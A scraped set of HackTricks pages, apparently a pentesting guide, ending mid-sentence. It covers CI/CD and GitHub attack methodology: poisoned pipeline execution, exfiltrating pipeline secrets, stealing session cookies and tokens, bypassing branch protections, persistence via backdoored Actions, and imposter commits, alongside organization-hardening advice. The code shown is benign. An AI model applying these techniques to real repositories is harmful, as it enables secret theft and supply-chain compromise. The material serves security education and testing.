[
    {
        "title": "HackTricks Cloud",
        "url": "https://cloud.hacktricks.xyz/welcome/readme",
        "text": "HackTricks Cloud\nSupport HackTricks and get benefits!\nIf you want to see your\ncompany advertised in HackTricks\nor if you want access to the\nlatest version of the PEASS or download HackTricks in PDF\nCheck the\nSUBSCRIPTION PLANS\n!\nGet the\nofficial PEASS & HackTricks swag\n​\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n​\nJoin the\n💬\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\n🐦\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nHackTricks\nand\nHackTricks Cloud\ngithub repos.\nHacktricks logos & motion designed by\n@ppiernacho\n.\nWelcome to the page where you will find each\nhacking trick/technique/whatever related to CI/CD & Cloud\nI have learnt in\nCTFs\n,\nreal\nlife\nenvironments\n,\nresearching\n, and\nreading\nresearches and news.\nPentesting CI/CD Methodology\nIn the HackTricks CI/CD Methodology you will find how to pentest infrastructure related to CI/CD activities.\nRead the following page for an\nintroduction:\nPentesting CI/CD Methodology\nPentesting Cloud Methodology\nIn the HackTricks Cloud Methodology you will find how to pentest cloud environments.\nRead the following page for an\nintroduction:\nPentesting Cloud Methodology\nLicense\nCopyright © Carlos Polop 2023. Except where otherwise specified (the external information copied into the book belongs to the original authors), the text on\nHACK TRICKS CLOUD\nby Carlos Polop is licensed under the\nAttribution-NonCommercial 4.0 International (CC BY-NC 4.0)\n.\nIf you want to use it with commercial purposes, contact me.\nDisclaimer\nThis book, 'HackTricks Cloud,' is intended for educational and informational purposes only. The content within this book is provided on an 'as is' basis, and the authors and publishers make no representations or warranties of any kind, express or implied, about the completeness, accuracy, reliability, suitability, or availability of the information, products, services, or related graphics contained within this book. Any reliance you place on such information is therefore strictly at your own risk.\nThe authors and publishers shall in no event be liable for any loss or damage, including without limitation, indirect or consequential loss or damage, or any loss or damage whatsoever arising from loss of data or profits arising out of, or in connection with, the use of this book.\nFurthermore, the techniques and tips described in this book are provided for educational and informational purposes only, and should not be used for any illegal or malicious activities. The authors and publishers do not condone or support any illegal or unethical activities, and any use of the information contained within this book is at the user's own risk and discretion.\nThe user is solely responsible for any actions taken based on the information contained within this book, and should always seek professional advice and assistance when attempting to implement any of the techniques or tips described herein.\nBy using this book, the user agrees to release the authors and publishers from any and all liability and responsibility for any damages, losses, or harm that may result from the use of this book or any of the information contained within it.\nSupport HackTricks and get benefits!\nIf you want to see your\ncompany advertised in HackTricks\nor if you want access to the\nlatest version of the PEASS or download HackTricks in PDF\nCheck the\nSUBSCRIPTION PLANS\n!\nGet the\nofficial PEASS & HackTricks swag\n​\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n​\nJoin the\n💬\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\n🐦\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nHackTricks\nand\nHackTricks Cloud\ngithub repos.\nNext\n- Pentesting CI/CD\nPentesting CI/CD Methodology\nLast modified\n3mo ago"
    },
    {
        "title": "About the Author",
        "url": "https://book.hacktricks.xyz/welcome/about-the-author",
        "text": "About the author\n​\n☁️ HackTricks Cloud ☁️\n-\n🐦 Twitter 🐦\n-\n🎙️ Twitch 🎙️\n-\n🎥 Youtube 🎥\n​\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n​\nGet the\nofficial PEASS & HackTricks swag\n​\nJoin the\n💬\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\n🐦\n​\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nHello!!\nThis is\nCarlos Polop\n.\nFirst of all, I want to indicate that\nI don't own this entire book\n, a lot of\ninformation was copy/pasted from other websites and that content belongs to them\n(this is indicated on the pages).\nI also want to say\nthanks to all the people that share cyber-security related information for free\non the Internet. Thanks to them I learn new hacking techniques that then I add to Hacktricks.\nMoreover, I also\nwrite the results of my own researches\nhere in HackTricks.\nTherefore, I expect that in\nHackTricks\nyou will find\nall\nthe\nsecurity tricks\navailable on the internet about a\ntopic\n+ potentially something\nextra\n. If you find something is\nmissing\n, please, send a\nPull Request\nto Hacktricks Github!\nBIO\nJust check my\nlinkedin\n:\nhttps://www.linkedin.com/in/carlos-polop-martin/\n​\nIf you find that HackTricks is very useful for you, please consider\nsupporting it!\n​\n☁️ HackTricks Cloud ☁️\n-\n🐦 Twitter 🐦\n-\n🎙️ Twitch 🎙️\n-\n🎥 Youtube 🎥\n​\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n​\nGet the\nofficial PEASS & HackTricks swag\n​\nJoin the\n💬\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\n🐦\n​\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nWelcome! -\nPrevious\nHackTricks Values & faq\nNext\n- Welcome!\nGetting Started in Hacking\nLast modified\n6mo ago"
    },
    {
        "title": "HackTricks Values & faq",
        "url": "https://book.hacktricks.xyz/welcome/hacktricks-values-and-faq",
        "text": "HackTricks Values & faq\n​\n☁️ HackTricks Cloud ☁️\n-\n🐦 Twitter 🐦\n-\n🎙️ Twitch 🎙️\n-\n🎥 Youtube 🎥\n​\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n​\nGet the\nofficial PEASS & HackTricks swag\n​\nJoin the\n💬\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\n🐦\n​\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nHackTricks Values\nThese are the\nvalues of the HackTricks Project\n:\nGive\nFREE\naccess to\nEDUCATIONAL hacking\nresources to\nALL\nInternet.\nHacking is about learning, and learning should be as free as possible.\nThe purpose of this book is to serve as a comprehensive\neducational resource\n.\nSTORE\nawesome\nhacking\ntechniques that the community publishes giving the\nORIGINAL\nAUTHORS\nall the\ncredits\n.\nWe don't want the credit from other people\n, we just want to store cool tricks for everyone.\nWe also write\nour own researches\nin HackTricks.\nIn several cases we will just write\nin HackTricks a summary of the important parts\nof the technique and will\nencourage the lector to visit the original post\nfor more details.\nORGANIZE\nall the hacking techniques in the book so it's\nMORE ACCESSIBLE\nThe HackTricks team has dedicated thousands of hours for free\nonly to organize the content\nso people can\nlearn faster\nHackTricks faq\nThank you so much for these resources, how can I thank you?\nYou can publicly thanks HackTricks teams for putting together all these resources publicly in a tweet mentioning\n@hacktricks_live\n.\nIf you are specially grateful you can also\nsponsor the project here\n.\nAnd don't forget to\ngive a star in the Github projects!\n(Find the links below).\nHow can I contribute to the project?\nYou can\nshare new tips and tricks with the community or fix bugs\nyou find in the books sending a\nPull Request\nto the respective Github pages:\n​\nhttps://github.com/carlospolop/hacktricks\n​\n​\nhttps://github.com/carlospolop/hacktricks-cloud\n​\nDon't forget to\ngive a star in the Github projects!\nCan I copy some content from HackTricks and put it in my blog?\nYes, you can, but\ndon't forget to mention the specific link(s)\nwhere the content was taken from.\nCan I copy all HackTricks in my blog?\nI would rather not\n. Thats\nnot going to benefit anyone\nas all the\ncontent is already publicly available\nin the official HackTricks books for free.\nIf you fear that it will disappear, just fork it in Github or download it, as I said it's already free.\nWhy do you have sponsors? Are HackTricks books for commercial purposes?\nThe first\nHackTricks\nvalue\nis to offer\nFREE\nhacking educational resources to\nALL\nthe world. The HackTricks team has\ndedicated thousands of hours\nto offer this content, again, for\nFREE\n.\nIf you think HackTricks books are made for\ncommercial purposes\nyou are\nCOMPLETELY WRONG\n.\nWe have sponsors because, even if all the content is FREE, we want to\noffer the community the possibility of appreciating our work\nif they want to. Therefore, we offer people the option to donate to HackTricks via\nGithub sponsors\n, and\nrelevant cybersecurity companies\nto sponsor HackTricks and to\nhave some ads\nin the book being the\nads\nalways placed in places where make them\nvisible\nbut\ndoesn't disturb the learning\nprocess if someone focus in the content.\nYou won't find HackTricks filled with annoying ads like other blogs with much less content than HackTricks, because HackTricks is not made for commercial purposes.\nWhat should I do if some HackTricks page is based on my blog post but it isn't referenced?\nWe are very sorry. This shouldn't have happened\n. Please, let us know via Github issues, Twitter, Discord... the link of the HackTricks page with the content and the link of your blog and\nwe will check it and add it ASAP\n.\nWhat should I do if there is content from my blog in HackTricks and I don't want it there?\nIn any case know that HackTricks in this case would be improving your\nSEO\nand\nencouraging\npeople to\ncheck your page\n. If you still want the content of your blog to be removed from HackTricks let us know.\nNote that asking this we will definitely\nremove every link to your blog\n, but if the same technique can be found in other web pages we will just change the source of the information and the explanation, so the real content won't probably leave HackTricks (in cybersecurity, in general, there are always several post talking about the same technique).\nLicense\nCopyright © Carlos Polop 2023. Except where otherwise specified (the external information copied into the book belongs to the original authors), the text on\nHACK TRICKS\nby Carlos Polop is licensed under the\nAttribution-NonCommercial 4.0 International (CC BY-NC 4.0)\n.\nIf you want to use it with commercial purposes, contact me.\nDisclaimer\nThis book, 'HackTricks,' is intended for educational and informational purposes only. The content within this book is provided on an 'as is' basis, and the authors and publishers make no representations or warranties of any kind, express or implied, about the completeness, accuracy, reliability, suitability, or availability of the information, products, services, or related graphics contained within this book. Any reliance you place on such information is therefore strictly at your own risk.\nThe authors and publishers shall in no event be liable for any loss or damage, including without limitation, indirect or consequential loss or damage, or any loss or damage whatsoever arising from loss of data or profits arising out of, or in connection with, the use of this book.\nFurthermore, the techniques and tips described in this book are provided for educational and informational purposes only, and should not be used for any illegal or malicious activities. The authors and publishers do not condone or support any illegal or unethical activities, and any use of the information contained within this book is at the user's own risk and discretion.\nThe user is solely responsible for any actions taken based on the information contained within this book, and should always seek professional advice and assistance when attempting to implement any of the techniques or tips described herein.\nBy using this book, the user agrees to release the authors and publishers from any and all liability and responsibility for any damages, losses, or harm that may result from the use of this book or any of the information contained within it.\n​\n☁️ HackTricks Cloud ☁️\n-\n🐦 Twitter 🐦\n-\n🎙️ Twitch 🎙️\n-\n🎥 Youtube 🎥\n​\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n​\nGet the\nofficial PEASS & HackTricks swag\n​\nJoin the\n💬\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\n🐦\n​\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nWelcome! -\nPrevious\nHackTricks\nNext\n- Welcome!\nAbout the author\nLast modified\n20d ago"
    },
    {
        "title": "Pentesting CI/CD Methodology",
        "url": "https://cloud.hacktricks.xyz/pentesting-ci-cd/pentesting-ci-cd-methodology",
        "text": "Pentesting CI/CD Methodology\nSupport HackTricks and get benefits!\nIf you want to see your\ncompany advertised in HackTricks\nor if you want access to the\nlatest version of the PEASS or download HackTricks in PDF\nCheck the\nSUBSCRIPTION PLANS\n!\nGet the\nofficial PEASS & HackTricks swag\n​\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n​\nJoin the\n💬\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\n🐦\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nHackTricks\nand\nHackTricks Cloud\ngithub repos.\nIntroduction\nDev environments have become a major part of today’s attack surface. And within them, the most lucrative assets are the systems responsible for\nCI and CD\n— those that build, test, and deploy code — and typically possess the\nsecrets and access\nto the most critical assets of the organization. So it’s only natural that attackers are continuously on the lookout for novel ways to gain access to these systems.\nVCS\nVCS stands for\nVersion Control System\n, this systems allows developers to\nmanage their source code\n. The most common one is\ngit\nand you will usually find companies using it in one of the following\nplatforms\n:\nGithub\nGitlab\nBitbucket\nGitea\nCloud providers (they offer their own VCS platforms)\nPipelines\nPipelines allow developers to\nautomate the execution of code\n(for building, testing, deploying... purposes) after certain actions occurs: A push, a PR, cron... They are terrible useful to a\nutomate all the steps from development to production\n.\nHowever, these systems need to be\nexecuted somewhere\nand usually with\nprivileged credentials to deploy code\n.\nVCS Pentesting Methodology\nEven if some VCS platforms allow to create pipelines for this section we are going to analyze only potential attacks to the control of the source code.\nPlatforms that contains the source code of your project contains sensitive information and people need to be very careful with the permissions granted inside this platform. These are some common problems across VCS platforms that attacker could abuse:\nLeaks\n: If your code contains leaks in the commits and the attacker can access the repo (because it's public or because he has access), he could discover the leaks.\nAccess\n: If an attacker can\naccess to an account inside the VCS platform\nhe could gain\nmore visibility and permissions\n.\nRegister\n: Some platforms will just allow external users to create an account.\nSSO\n: Some platforms won't allow users to register, but will allow anyone to access with a valid SSO (so an attacker could use his github account to enter for example).\nCredentials\n: Username+Pwd, personal tokens, ssh keys, Oauth tokens, cookies... there are several kind of tokens a user could steal to access in some way a repo.\nWebhooks\n: VCS platforms allow to generate webhooks. If they are\nnot protected\nwith non visible secrets an\nattacker could abuse them\n.\nIf no secret is in place, the attacker could abuse the webhook of the third party platform\nIf the secret is in the URL, the same happens and the attacker also have the secret\nCode compromise:\nIf a malicious actor has some kind of\nwrite\naccess over the repos, he could try to\ninject malicious code\n. In order to be successful he might need to\nbypass branch protections\n. These actions can be performed with different goals in mid:\nCompromise the main branch to\ncompromise production\n.\nCompromise the main (or other branches) to\ncompromise developers machines\n(as they usually execute test, terraform or other things inside the repo in their machines).\nCompromise the pipeline\n(check next section)\nPipelines Pentesting Methodology\nThe most common way to define a pipeline, is by using a\nCI configuration file hosted in the repository\nthe pipeline builds. This file describes the order of executed jobs, conditions that affect the flow, and build environment settings.\nThese files typically have a consistent name and format, for example — Jenkinsfile (Jenkins), .gitlab-ci.yml (GitLab), .circleci/config.yml (CircleCI), and the GitHub Actions YAML files located under .github/workflows. When triggered, the pipeline job\npulls the code\nfrom the selected source (e.g. commit / branch), and\nruns the commands specified in the CI configuration file\nagainst that code.\nTherefore the ultimate goal of the attacker is to somehow\ncompromise those configuration files\nor the\ncommands they execute\n.\nPPE - Poisoned Pipeline Execution\nThe Poisoned Pipeline Execution (PPE) vector\nabuses permissions against an SCM repository\n, in a way that causes a CI pipeline to execute malicious commands. Users that have permissions to\nmanipulate the CI configuration files, or other files which the CI pipeline job relies on\n, can modify them to contain\nmalicious command\ns, ultimately “poisoning” the CI pipeline executing these commands.\nFor a malicious actor to be successful performing a PPE attack he needs to be able to:\nHave\nwrite access to the VCS platform\n, as usually pipelines are triggered when a push or a pull request is performed. (Check the VCS pentesting methodology for a summary of ways to get access).\nNote that sometimes an\nexternal PR count as \"write access\"\n.\nEven if he has write permissions, he needs to be sure he can\nmodify the CI config file or other files the config is relying on\n.\nFor this, he might need to be able to\nbypass branch protections\n.\nThere are 3 PPE flavours:\nD-PPE\n: A\nDirect PPE\nattack occurs when the actor\nmodifies the CI config\nfile that is going to be executed.\nI-DDE\n: An\nIndirect PPE\nattack occurs when the actor\nmodifies\na\nfile\nthe CI config file that is going to be executed\nrelays on\n(like a make file or a terraform config).\nPublic PPE or 3PE\n: In some cases the pipelines can be\ntriggered by users that doesn't have write access in the repo\n(and that might not even be part of the org) because they can send a PR.\n3PE Command Injection\n: Usually, CI/CD pipelines will\nset environment variables\nwith\ninformation about the PR\n. If that value can be controlled by an attacker (like the title of the PR) and is\nused\nin a\ndangerous place\n(like executing\nsh commands\n), an attacker might\ninject commands in there\n.\nExploitation Benefits\nKnowing the 3 flavours to poison a pipeline, lets check what an attacker could obtain after a successful exploitation:\nSecrets\n: As it was mentioned previously, pipelines require\nprivileges\nfor their jobs (retrieve the code, build it, deploy it...) and this privileges are usually\ngranted in secrets\n. These secrets are usually accessible via\nenv variables or files inside the system\n. Therefore an attacker will always try to exfiltrate as much secrets as possible.\nDepending on the pipeline platform the attacker\nmight need to specify the secrets in the config\n. This means that is the attacker cannot modify the CI configuration pipeline (\nI-PPE\nfor example), he could\nonly exfiltrate the secrets that pipeline has\n.\nComputation\n: The code is executed somewhere, depending on where is executed an attacker might be able to pivot further.\nOn-Premises\n: If the pipelines are executed on premises, an attacker might end in an\ninternal network with access to more resources\n.\nCloud\n: The attacker could access\nother machines in the cloud\nbut also could\nexfiltrate\nIAM roles/service accounts\ntokens\nfrom it to obtain\nfurther access inside the cloud\n.\nPlatforms machine\n: Sometimes the jobs will be execute inside the\npipelines platform machines\n, which usually are inside a cloud with\nno more access\n.\nSelect it:\nSometimes the\npipelines platform will have configured several machines\nand if you can\nmodify the CI configuration file\nyou can\nindicate where you want to run the malicious code\n. In this situation, an attacker will probably run a reverse shell on each possible machine to try to exploit it further.\nCompromise production\n: If you ware inside the pipeline and the final version is built and deployed from it, you could\ncompromise the code that is going to end running in production\n.\nMore relevant info\nTools & CIS Benchmark\n****\nChain-bench\nis an open-source tool for auditing your software supply chain stack for security compliance based on a new\nCIS Software Supply Chain benchmark\n. The auditing focuses on the entire SDLC process, where it can reveal risks from code time into deploy time.\nTop 10 CI/CD Security Risk\nCheck this interesting article about the top 10 CI/CD risks according to Cider:\nhttps://www.cidersecurity.io/top-10-cicd-security-risks/\n​\nLabs\nOn each platform that you can run locally you will find how to launch it locally so you can configure it as you want to test it\nGitea + Jenkins lab:\nhttps://github.com/cider-security-research/cicd-goat\n​\nAutomatic Tools\n****\nCheckov\n:\nCheckov\nis a static code analysis tool for infrastructure-as-code.\nReferences\n​\nhttps://www.cidersecurity.io/blog/research/ppe-poisoned-pipeline-execution/?utm_source=github&utm_medium=github_page&utm_campaign=ci%2fcd%20goat_060422\n​\nSupport HackTricks and get benefits!\nIf you want to see your\ncompany advertised in HackTricks\nor if you want access to the\nlatest version of the PEASS or download HackTricks in PDF\nCheck the\nSUBSCRIPTION PLANS\n!\nGet the\nofficial PEASS & HackTricks swag\n​\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n​\nJoin the\n💬\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\n🐦\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nHackTricks\nand\nHackTricks Cloud\ngithub repos.\nWelcome! -\nPrevious\nHackTricks Cloud\nNext\n- Pentesting CI/CD\nGithub Security\nLast modified\n1mo ago"
    },
    {
        "title": "Github Security",
        "url": "https://cloud.hacktricks.xyz/pentesting-ci-cd/github-security",
        "text": "Github Security\nSupport HackTricks and get benefits!\nIf you want to see your\ncompany advertised in HackTricks\nor if you want access to the\nlatest version of the PEASS or download HackTricks in PDF\nCheck the\nSUBSCRIPTION PLANS\n!\nGet the\nofficial PEASS & HackTricks swag\n​\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n​\nJoin the\n💬\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\n🐦\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nHackTricks\nand\nHackTricks Cloud\ngithub repos.\nWhat is Github\n(From\nhere\n) At a high level,\nGitHub is a website and cloud-based service that helps developers store and manage their code, as well as track and control changes to their code\n.\nBasic Information\nBasic Github Information\nExternal Recon\nGithub repositories can be configured as public, private and internal.\nPrivate\nmeans that\nonly\npeople of the\norganisation\nwill be able to access them\nInternal\nmeans that\nonly\npeople of the\nenterprise\n(an enterprise may have several organisations) will be able to access it\nPublic\nmeans that\nall internet\nis going to be able to access it.\nIn case you know the\nuser, repo or organisation you want to target\nyou can use\ngithub dorks\nto find sensitive information or search for\nsensitive information leaks\non each repo\n.\nGithub Dorks\nGithub allows to\nsearch for something specifying as scope a user, a repo or an organisation\n. Therefore, with a list of strings that are going to appear close to sensitive information you can easily\nsearch for potential sensitive information in your target\n.\nTools (each tool contains its list of dorks):\n​\nhttps://github.com/obheda12/GitDorker\n(\nDorks list\n)\n​\nhttps://github.com/techgaun/github-dorks\n(\nDorks list\n)\n​\nhttps://github.com/hisxo/gitGraber\n(\nDorks list\n)\nGithub Leaks\nPlease, note that the github dorks are also meant to search for leaks using github search options. This section is dedicated to those tools that will\ndownload each repo and search for sensitive information in them\n(even checking certain depth of commits).\nTools (each tool contains its list of regexes):\n​\nhttps://github.com/zricethezav/gitleaks\n​\n​\nhttps://github.com/trufflesecurity/truffleHog\n​\n​\nhttps://github.com/eth0izzle/shhgit\n​\n​\nhttps://github.com/michenriksen/gitrob\n​\n​\nhttps://github.com/anshumanbh/git-all-secrets\n​\n​\nhttps://github.com/kootenpv/gittyleaks\n​\n​\nhttps://github.com/awslabs/git-secrets\n​\nWhen you look for leaks in a repo and run something like\ngit log -p\ndon't forget there might be\nother branches with other commits\ncontaining secrets!\nExternal Forks\nIt's possible to\ncompromise repos abusing pull requests\n. To know if a repo is vulnerable you mostly need to read the Github Actions yaml configs.\nMore info about this below\n.\nOrganization Hardening\nMember Privileges\nThere are some\ndefault privileges\nthat can be assigned to\nmembers\nof the organization. These can be controlled from the page\nhttps://github.com/organizations/<org_name>/settings/member_privileges\nor from the\nOrganizations API\n.\nBase permissions\n: Members will have the permission None/Read/write/Admin over the org repositories. Recommended is\nNone\nor\nRead\n.\nRepository forking\n: If not necessary, it's better to\nnot allow\nmembers to fork organization repositories.\nPages creation\n: If not necessary, it's better to\nnot allow\nmembers to publish pages from the org repos. If necessary you can allow to create public or private pages.\nIntegration access requests\n: With this enabled outside collaborators will be able to request access for GitHub or OAuth apps to access this organization and its resources. It's usually needed, but if not, it's better to disable it.\nI couldn't find this info in the APIs response, share if you do\nRepository visibility change\n: If enabled,\nmembers\nwith\nadmin\npermissions for the\nrepository\nwill be able to\nchange its visibility\n. If disabled, only organization owners can change repository visibilities. If you\ndon't\nwant people to make things\npublic\n, make sure this is\ndisabled\n.\nI couldn't find this info in the APIs response, share if you do\nRepository deletion and transfer\n: If enabled, members with\nadmin\npermissions for the repository will be able to\ndelete\nor\ntransfer\npublic and private\nrepositories.\nI couldn't find this info in the APIs response, share if you do\nAllow members to create teams\n: If enabled, any\nmember\nof the organization will be able to\ncreate\nnew\nteams\n. If disabled, only organization owners can create new teams. It's better to have this disabled.\nI couldn't find this info in the APIs response, share if you do\nMore things can be configured\nin this page but the previous are the ones more security related.\nActions Settings\nSeveral security related settings can be configured for actions from the page\nhttps://github.com/organizations/<org_name>/settings/actions\n.\nNote that all this configurations can also be set on each repository independently\nGithub actions policies\n: It allows you to indicate which repositories can tun workflows and which workflows should be allowed. It's recommended to\nspecify which repositories\nshould be allowed and not allow all actions to run.\n​\nAPI-1\n,\nAPI-2\n​\nFork pull request workflows from outside collaborators\n: It's recommended to\nrequire approval for all\noutside collaborators.\nI couldn't find an API with this info, share if you do\nRun workflows from fork pull requests\n: It's highly\ndiscouraged to run workflows from pull requests\nas maintainers of the fork origin will be given the ability to use tokens with read permissions on the source repository.\nI couldn't find an API with this info, share if you do\nWorkflow permissions\n: It's highly recommended to\nonly give read repository permissions\n. It's discouraged to give write and create/approve pull requests permissions to avoid the abuse of the GITHUB_TOKEN given to running workflows.\n​\nAPI\n​\nIntegrations\nLet me know if you know the API endpoint to access this info!\nThird-party application access policy\n: It's recommended to restrict the access to every application and allow only the needed ones (after reviewing them).\nInstalled GitHub Apps\n: It's recommended to only allow the needed ones (after reviewing them).\nRecon & Attacks abusing credentials\nFor this scenario we are going to suppose that you have obtained some access to a github account.\nWith User Credentials\nIf you somehow already have credentials for a user inside an organization you can\njust login\nand check which\nenterprise and organization roles you have\n, if you are a raw member, check which\npermissions raw members have\n, in which\ngroups\nyou are, which\npermissions you have\nover which\nrepos,\nand\nhow are the repos protected.\nNote that\n2FA may be used\nso you will only be able to access this information if you can also\npass that check\n.\nNote that if you\nmanage to steal the\nuser_session\ncookie\n(currently configured with SameSite: Lax) you can\ncompletely impersonate the user\nwithout needing credentials or 2FA.\nCheck the section below about\nbranch protections bypasses\nin case it's useful.\nWith User SSH Key\nGithub allows\nusers\nto set\nSSH keys\nthat will be used as\nauthentication method to deploy code\non their behalf (no 2FA is applied).\nWith this key you can perform\nchanges in repositories where the user has some privileges\n, however you can not sue it to access github api to enumerate the environment. However, you can get\nenumerate local settings\nto get information about the repos and user you have access to:\n# Go to the the repository folder\n# Get repo config and current user name and email\ngit\nconfig\n--list\nIf the user has configured its username as his github username you can access the\npublic keys he has set\nin his account in\nhttps://github.com/<github_username>.keys\n, you could check this to confirm the private key you found can be used.\nSSH keys\ncan also be set in repositories as\ndeploy keys\n. Anyone with access to this key will be able to\nlaunch projects from a repository\n. Usually in a server with different deploy keys the local file\n~/.ssh/config\nwill give you info about key is related.\nGPG Keys\nAs explained\nhere\nsometimes it's needed to sign the commits or you might get discovered.\nCheck locally if the current user has any key with:\ngpg --list-secret-keys --keyid-format\n=\nlong\nWith User Token\nFor an introduction about\nUser Tokens check the basic information\n.\nA user token can be used\ninstead of a password\nfor Git over HTTPS, or can be used to\nauthenticate to the API over Basic Authentication\n. Depending on the privileges attached to it you might be able to perform different actions.\nA User token looks like this:\nghp_EfHnQFcFHX6fGIu5mpduvRiYR584kK0dX123\nWith Oauth Application\nFor an introduction about\nGithub Oauth Applications check the basic information\n.\nAn attacker might create a\nmalicious Oauth Application\nto access privileged data/actions of the users that accepts them probably as part of a phishing campaign.\nThese are the\nscopes an Oauth application can request\n. A should always check the scopes requested before accepting them.\nMoreover, as explained in the basic information,\norganizations can give/deny access to third party applications\nto information/repos/actions related with the organisation.\nWith Github Application\nFor an introduction about\nGithub Applications check the basic information\n.\nAn attacker might create a\nmalicious Github Application\nto access privileged data/actions of the users that accepts them probably as part of a phishing campaign.\nMoreover, as explained in the basic information,\norganizations can give/deny access to third party applications\nto information/repos/actions related with the organisation.\nCompromise & Abuse Github Action\nThere are several techniques to compromise and abuse a Github Action, check them here:\nAbusing Github Actions\nBranch Protection Bypass\nRequire a number of approvals\n: If you compromised several accounts you might just accept your PRs from other accounts. If you just have the account from where you created the PR you cannot accept your own PR. However, if you have access to a\nGithub Action\nenvironment inside the repo, using the\nGITHUB_TOKEN\nyou might be able to\napprove your PR\nand get 1 approval this way.\nNote for this and for the Code Owners restriction that usually a user won't be able to approve his own PRs, but if you are, you can abuse it to accept your PRs.\nDismiss approvals when new commits are pushed\n: If this isn’t set, you can submit legit code, wait till someone approves it, and put malicious code and merge it into the protected branch.\nRequire reviews from Code Owners\n: If this is activated and you are a Code Owner, you could make a\nGithub Action create your PR and then approve it yourself\n.\nWhen a\nCODEOWNER file is missconfigured\nGithub doesn't complain but it does't use it. Therefore, if it's missconfigured it's\nCode Owners protection isn't applied.\nAllow specified actors to bypass pull request requirements\n: If you are one of these actors you can bypass pull request protections.\nInclude administrators\n: If this isn’t set and you are admin of the repo, you can bypass this branch protections.\nPR Hijacking\n: You could be able to\nmodify the PR of someone else\nadding malicious code, approving the resulting PR yourself and merging everything.\nRemoving Branch Protections\n: If you are an\nadmin of the repo you can disable the protections\n, merge your PR and set the protections back.\nBypassing push protections\n: If a repo\nonly allows certain users\nto send push (merge code) in branches (the branch protection might be protecting all the branches specifying the wildcard\n*\n).\nIf you have\nwrite access over the repo but you are not allowed to push code\nbecause of the branch protection, you can still\ncreate a new branch\nand within it create a\ngithub action that is triggered when code is pushed\n. As the\nbranch protection won't protect the branch until it's created\n, this first code push to the branch will\nexecute the github action\n.\nBypass Environments Protections\nFor an introduction about\nGithub Environment check the basic information\n.\nIn case an environment can be\naccessed from all the branches\n, it's\nisn't protected\nand you can easily access the secrets inside the environment. Note that you might find repos where\nall the branches are protected\n(by specifying its names or by using\n*\n) in that scenario,\nfind a branch were you can push code\nand you can\nexfiltrate\nthe secrets creating a new github action (or modifying one).\nNote, that you might find the edge case where\nall the branches are protected\n(via wildcard\n*\n) it's specified\nwho can push code to the branches\n(\nyou can specify that in the branch protection\n) and\nyour user isn't allowed\n. You can still run a custom github action because you can create a branch and use the push trigger over itself. The\nbranch protection allows the push to a new branch so the github action will be triggered\n.\npush\n:\n# Run it when a push is made to a branch\nbranches\n:\n-\ncurrent_branch_name\n#Use '**' to run when a push is made to any branch\nNote that\nafter the creation\nof the branch the\nbranch protection will apply to the new branch\nand you won't be able to modify it, but for that time you will have already dumped the secrets.\nPersistence\nGenerate\nuser token\nSteal\ngithub tokens\nfrom\nsecrets\nDeletion\nof workflow\nresults\nand\nbranches\nGive\nmore permissions to all the org\nCreate\nwebhooks\nto exfiltrate information\nInvite\noutside collaborators\nRemove\nwebhooks\nused by the\nSIEM\nCreate/modify\nGithub Action\nwith a\nbackdoor\nFind\nvulnerable Github Action to command injection\nvia\nsecret\nvalue modification\nImposter Commits - Backdoor via repo commits\nIn Github it's possible to\ncreate a PR to a repo from a fork\n. Even if the PR is\nnot accepted\n, a\ncommit\nid inside the orginal repo is going to be created for the fork version of the code. Therefore, an attacker\ncould pin to use an specific commit from an apparently ligit repo that wasn't created by the owner of the repo\n.\nLike\nthis\n:\nname\n:\nexample\non\n:\n[\npush\n]\njobs\n:\ncommit\n:\nruns-on\n:\nubuntu\n-\nlatest\nsteps\n:\n-\nuses\n:\nactions/checkout@c7d749a2d57b4b375d1ebcd17cfbfb60c676f18e\n-\nshell\n:\nbash\nrun\n:\n|\necho 'hello world!'\nFor more info 